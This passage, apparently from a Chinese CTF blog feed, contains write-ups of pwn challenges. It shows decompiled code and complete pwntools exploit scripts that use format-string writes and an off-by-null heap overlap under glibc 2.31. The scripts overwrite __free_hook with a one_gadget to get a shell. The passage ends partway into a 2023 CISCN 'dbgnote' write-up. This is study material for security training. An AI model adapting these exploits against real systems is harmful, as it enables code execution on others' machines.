punctuation">,</span> <span class="token number">0xebd52</span><span class="token punctuation">,</span> <span class="token number">0xebdaf</span><span class="token punctuation">,</span> <span class="token number">0xebdb3</span><span class="token punctuation">]</span>one_gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseprintf_ret <span class="token operator">=</span> ptr <span class="token operator">-</span> <span class="token number">0x10</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'input your data ;)\n'</span><span class="token punctuation">,</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>rbp <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%15$hn\x00'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'input your data ;)\n'</span><span class="token punctuation">,</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>one_gadget <span class="token operator">>></span> i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%45$hhn\x00'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'input your data ;)\n'</span><span class="token punctuation">,</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>printf_ret <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%15$hn\x00'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'input your data ;)\n'</span><span class="token punctuation">,</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0xb1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%45$hhn\x00'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="pwnpwn"><a href="#pwnpwn" class="headerlink" title="pwnpwn"></a>pwnpwn</h2><p>漏洞点</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">__int64 add()&#123;    ...    v10 &#x3D; read(0, content, v9);    *(_BYTE *)(v14 + v10) &#x3D; 0;                  &#x2F;&#x2F; off-by-null  &#125;  do    result &#x3D; (((_BYTE)dword_2030B4 - 1) * (_BYTE)dword_2030B4) &amp; 1;  while ( dword_20302C &gt;&#x3D; 10 &amp;&amp; (_DWORD)result !&#x3D; 0 );  return result;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该题是有个<code>2.31</code>下的<code>off-by-null</code>利用题，其中需要注意的是</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">__int64 __fastcall check_pas(__int64 *a1)&#123;  const char *v1; &#x2F;&#x2F; rdi  char len; &#x2F;&#x2F; r8  __int64 *len_addr; &#x2F;&#x2F; rax  int v4; &#x2F;&#x2F; eax  int v5; &#x2F;&#x2F; eax  const char *v7; &#x2F;&#x2F; rdi  char v8; &#x2F;&#x2F; al  __int64 *v9; &#x2F;&#x2F; [rsp+0h] [rbp-40h] BYREF  int v10; &#x2F;&#x2F; [rsp+Ch] [rbp-34h]  int v11; &#x2F;&#x2F; [rsp+10h] [rbp-30h]  bool judge; &#x2F;&#x2F; [rsp+17h] [rbp-29h]  __int64 *v13; &#x2F;&#x2F; [rsp+18h] [rbp-28h]  __int64 *v14; &#x2F;&#x2F; [rsp+20h] [rbp-20h]  __int64 *v15; &#x2F;&#x2F; [rsp+28h] [rbp-18h]  v15 &#x3D; a1;  if ( dword_2030AC &gt;&#x3D; 10 &amp;&amp; ((((_BYTE)dword_203048 - 1) * (_BYTE)dword_203048) &amp; 1) !&#x3D; 0 )    goto LABEL_8;  while ( 1 )  &#123;    *(&amp;v9 - 2) &#x3D; v15;    v1 &#x3D; (const char *)*(&amp;v9 - 2);    v14 &#x3D; (__int64 *)(&amp;v9 - 2);    v13 &#x3D; (__int64 *)(&amp;v9 - 2);    len &#x3D; strlen(v1);    len_addr &#x3D; v13;    *(_BYTE *)v13 &#x3D; len;    judge &#x3D; *(unsigned __int8 *)len_addr &lt;&#x3D; 2u;    if ( dword_2030AC &lt; 10 || ((((_BYTE)dword_203048 - 1) * (_BYTE)dword_203048) &amp; 1) &#x3D;&#x3D; 0 )      break;LABEL_8:    *(&amp;v9 - 2) &#x3D; v15;    v7 &#x3D; (const char *)*(&amp;v9 - 2);    v9 &#x3D; (__int64 *)(&amp;v9 - 2);    v8 &#x3D; strlen(v7);    *(_BYTE *)v9 &#x3D; v8;  &#125;  if ( judge || *(unsigned __int8 *)v13 &gt; 7u )  &#123;    v4 &#x3D; printf(&quot;passwd error&quot;);    check &#x3D; 0;    *(_DWORD *)v14 &#x3D; 0;    v11 &#x3D; v4;  &#125;  else  &#123;    v5 &#x3D; printf(&quot;passwd is ok&quot;);    check &#x3D; 1;    *(_DWORD *)v14 &#x3D; 0;    v10 &#x3D; v5;  &#125;  return *(unsigned int *)v14;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存在一个检查<code>password</code>的函数，当<code>password</code>长度在<code>(2,7]</code>之间时返回<code>1</code>，否则返回<code>0</code>，并且在输入之前并不会清空缓冲区，即存在上次输入的内容</p><p>在<code>delete</code>和<code>show</code>函数中需要<code>check</code>为<code>0</code>才能正常释放</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">char delete()&#123;  ...  do    v6 &#x3D; check &#x3D;&#x3D; 1;  while ( dword_203038 &gt;&#x3D; 10 &amp;&amp; ((((_BYTE)dword_2030BC - 1) * (_BYTE)dword_2030BC) &amp; 1) !&#x3D; 0 );  LOBYTE(v2) &#x3D; v6;  if ( v6 )  &#123;    free((void *)ptr[*v13]);    v2 &#x3D; ptr;    ptr[*v13] &#x3D; 0LL;  &#125;  return (char)v2;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">int show()&#123;  ...  if ( !check )  &#123;    puts(&quot;content: &quot;);    LODWORD(heap_ptr) &#x3D; puts((const char *)ptr[index]);  &#125;  return (int)heap_ptr;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而在<code>edit</code>函数中需要<code>check</code>为<code>1</code>才能正常释放</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">ssize_t edit()&#123;  __int64 v1; &#x2F;&#x2F; [rsp+50h] [rbp-20h] BYREF  __int64 v2; &#x2F;&#x2F; [rsp+58h] [rbp-18h]  int index; &#x2F;&#x2F; [rsp+64h] [rbp-Ch] OVERLAPPED BYREF  if ( !check )  &#123;    if ( dword_203028 &lt; 10 || ((((_BYTE)dword_2030B0 - 1) * (_BYTE)dword_2030B0) &amp; 1) &#x3D;&#x3D; 0 )    &#123;      puts(&quot;you can&#39;t do that&quot;);      exit(0);    &#125;    puts(&quot;you can&#39;t do that&quot;);    exit(0);  &#125;  ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一开始需要通过一个猜数字的游戏，四个数字是根据时间随机生成的并且不能覆盖<code>seed</code>，直接联合<code>C</code>编程即可得到答案</p><p>首先泄露<code>libc</code>地址，直接创建属于<code>unsorted bin</code>的堆释放掉再创建回来之后<code>show</code>，堆中残留了<code>unsorted bin</code>中的地址，<code>printf</code>会存在<code>\x00</code>截断的问题，因此要用<code>edit</code>函数改<code>fd</code>位置的内容并去泄露<code>bk</code>位置的内容，因为<code>edit</code>函数会在输入长度不足的情况下自动补到<code>0x8</code>，所以输入的长度短也没问题</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">ssize_t edit()&#123;  ...  while ( 1 )  &#123;    index &#x3D; 0;    puts(&quot;give me your index&quot;);    __isoc99_scanf(&quot;%d&quot;, &amp;index);    v1 &#x3D; 0xDEADBEEFDEADBEEFLL;    v2 &#x3D; 0xDEADBEEFDEADBEEFLL;    sub_15C0(ptr[index], &amp;v1);    puts(&quot;give me your index&quot;);    __isoc99_scanf(&quot;%d&quot;, &amp;index);    if ( dword_203028 &lt; 10 || ((((_BYTE)dword_2030B0 - 1) * (_BYTE)dword_2030B0) &amp; 1) &#x3D;&#x3D; 0 )      break;LABEL_14:    index &#x3D; 0;    puts(&quot;give me your index&quot;);    __isoc99_scanf(&quot;%d&quot;, &amp;index);    v1 &#x3D; 0xDEADBEEFDEADBEEFLL;    v2 &#x3D; 0xDEADBEEFDEADBEEFLL;    sub_15C0(ptr[index], &amp;v1);    puts(&quot;give me your index&quot;);    __isoc99_scanf(&quot;%d&quot;, &amp;index);  &#125;  ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来需要泄露堆地址，这里需要用到<code>large bin</code>的<code>fd_nextsize</code>和<code>bk_nextsize</code>链会链接到下一个堆或自身的特点，用相同的方法先把<code>fd</code>和<code>bk</code>的位置覆盖掉再调用<code>show</code>函数泄露堆地址</p><p>最后就是布置堆进行<code>off-by-null</code>的利用，其中需要绕过对<code>fd</code>和<code>bk</code>的检查，即<code>Fd-&gt;bk == victim</code>和<code>Bk-&gt;fd == victim</code>，最终实现<code>overlap</code></p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>seed <span class="token operator">=</span> libc<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token punctuation">;</span>p <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   p <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'please input your number:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'root@$\n'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'give me your index:\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'give me your size:\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'give me your content:\n'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'root@$\n'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'give me your index:\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pd</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> passwd<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'root@$\n'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'please input your username\n'</span><span class="token punctuation">,</span> username<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'please input your passwd\n'</span><span class="token punctuation">,</span> passwd<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'root@$\n'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'give me your index\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'give me your index\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'give me your content:\n'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'root@$\n'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'give me your index:\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x4f0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>pd<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">b'aa'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>pd<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">96</span> <span class="token operator">-</span> <span class="token number">0x10</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xe6aee</span><span class="token punctuation">,</span> <span class="token number">0xe6af1</span><span class="token punctuation">,</span> <span class="token number">0xe6af4</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basepd<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token punctuation">,</span> <span class="token string">b'aaa'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span>pd<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x290</span>pd<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">b'aaa'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>p1 <span class="token operator">=</span> p64<span class="token punctuation">(</span>heap_base <span class="token operator">+</span> <span class="token number">0x6c0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x18</span> <span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x51</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_base <span class="token operator">+</span> <span class="token number">0x6f0</span> <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_base <span class="token operator">+</span> <span class="token number">0x6f0</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> p2<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
            <tag> 非栈上的格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023-ciscn-pwn复现</title>
      <link href="/2023/08/03/2023-ciscn-pwn-fu-xian/2023-ciscn-pwn-fu-xian/"/>
      <url>/2023/08/03/2023-ciscn-pwn-fu-xian/2023-ciscn-pwn-fu-xian/</url>
      
        <content type="html"><![CDATA[<h2 id="dbgnote"><a href="#dbgnote" class="headerlink" title="dbgnote"></a>dbgnote</h2><p>这题…复现的让我觉得我没学过<code>pwn</code></p><p>漏洞点：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">  while ( 1 )  &#123;LABEL_6:    v5 &#x3D; aNoteAdd;    v6 &#x3D; 0;    sub_1B20(&amp;userName);    read_input(buf, 0x32LL);                    &#x2F;&#x2F;overflow    while ( strcmp(buf, v5) )    &#123;      ++v6;      v5 +&#x3D; 16;      if ( v6 &#x3D;&#x3D; 6 )      &#123;        puts(&quot;Error.&quot;);        goto LABEL_6;      &#125;    &#125;    call_func[v6]();  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">__int64 input_vuln()&#123;  __int128 vars0; &#x2F;&#x2F; [rsp+0h] [rbp+0h] BYREF  __int64 vars10; &#x2F;&#x2F; [rsp+10h] [rbp+10h]  unsigned __int64 vars18; &#x2F;&#x2F; [rsp+18h] [rbp+18h]  vars18 &#x3D; __readfsqword(0x28u);  vars0 &#x3D; 0LL;  vars10 &#x3D; 0LL; 